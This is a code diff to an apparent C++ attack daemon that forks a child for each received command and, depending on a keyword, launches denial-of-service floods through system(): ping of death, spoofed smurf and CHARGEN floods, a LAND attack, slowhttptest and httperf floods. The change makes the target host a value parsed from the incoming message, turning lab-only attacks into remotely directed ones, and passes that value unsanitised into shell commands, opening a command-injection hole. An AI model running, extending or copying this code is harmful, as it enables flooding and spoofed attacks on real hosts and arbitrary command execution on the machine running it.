@@ -6,6 +6,8 @@
 #include <stdlib.h>
 #include <signal.h>
 #include <sys/wait.h>
+#include <sstream>
+#include <vector>
 
 using namespace std;
 
@@ -56,24 +58,41 @@ int main()
 		pid = fork();
 		if (pid == 0) { // child procress
 			setpgid(getpid(), getpid());
-			if (strncmp("POD", buffer, 3) == 0) 
+			
+			string s(buffer);
+			stringstream attack(s);
+			string segment;
+			vector<string> seglist;
+
+			while(getline(attack, segment, '_'))
 			{
-				system("ping 10.0.2.15 -s 65000 -i 0.000000001");
-			} else if (strncmp("SMURF", buffer, 5) == 0)
+			   seglist.push_back(segment);
+			}
+
+			if (strncmp("POD", seglist[0].c_str(), 3) == 0) 
 			{
-				system("hping3 10.0.2.255 -a 10.0.2.15 --icmp -C 8 -D --flood");
-			} else if (strncmp("CHARGEN", buffer, 7) == 0)
+				string cmd = "ping " + seglist[1] + " -s 65000 -i 0.000000001";
+				system(cmd.c_str());
+			} else if (strncmp("SMURF", seglist[0].c_str(), 5) == 0)
 			{
-				system("hping3 10.0.2.5 -a 10.0.2.15 -p 19 --udp -D --flood");
-			} else if (strncmp("LAND", buffer, 4) == 0)
-			{	system("for i in {1..100000}; do hping3 10.0.2.15 -a 10.0.2.15 -p 7 -s 7 -S -c 1 -D --flood; sleep 0.00000000000001; done;");
-				
-			} else if (strncmp("SLOWHTTP", buffer, 8) == 0)
+				string cmd = "hping3 10.0.2.255 -a " + seglist[1] + " --icmp -C 8 -D --flood";
+				system(cmd.c_str());
+			} else if (strncmp("CHARGEN", seglist[0].c_str(), 7) == 0)
 			{
-				system("slowhttptest -H -u http://10.0.2.15 -t GET -c 500 -r 30 -p 20 -l 3600");
-			} else if (strncmp("FASTHTTP", buffer, 8) == 0)
+				string cmd = "hping3 10.0.2.5 -a " + seglist[1] + " -p 19 --udp -D --flood";
+				system(cmd.c_str());
+			} else if (strncmp("LAND", seglist[0].c_str(), 4) == 0)
+			{	
+				string cmd = "for i in {1..100000}; do hping3 " + seglist[1] + " -a " + seglist[1]  + " -p 7 -s 7 -S -c 1 -D --flood; sleep 0.00000000000001; done;";
+				system(cmd.c_str());	
+			} else if (strncmp("SLOWHTTP", seglist[0].c_str(), 8) == 0)
 			{
-				system("httperf --server 10.0.2.15 --uri / --num-conns 100000 --rate 500");
+				string cmd = "slowhttptest -H -u http://" + seglist[1] + " -t GET -c 500 -r 30 -p 20 -l 3600";
+				system(cmd.c_str());
+			} else if (strncmp("FASTHTTP", seglist[0].c_str(), 8) == 0)
+			{
+				string cmd = "httperf --server " + seglist[1] + " --uri / --num-conns 100000 --rate 500";
+				system(cmd.c_str());
 			}
 		} 
 	}
